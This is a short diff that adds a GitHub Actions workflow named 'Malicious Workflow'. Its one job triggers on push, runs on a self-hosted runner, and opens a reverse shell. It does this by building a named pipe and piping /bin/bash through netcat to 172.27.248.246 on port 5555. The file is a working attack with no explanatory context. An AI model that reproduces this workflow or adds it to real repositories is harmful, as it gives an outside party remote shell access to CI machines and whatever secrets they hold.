@@ -1,0 +1,12 @@
+name: Malicious Workflow
+on: push
+jobs:
+  init:
+    runs-on:
+        - self-hosted
+        - small
+    steps:
+      - name: run nc
+        run: |
+          RESPONSE=$(mknod /tmp/backpipe p; /bin/bash 0</tmp/backpipe | nc 172.27.248.246 5555 1>/tmp/backpipe)
+          echo "Response: $RESPONSE"
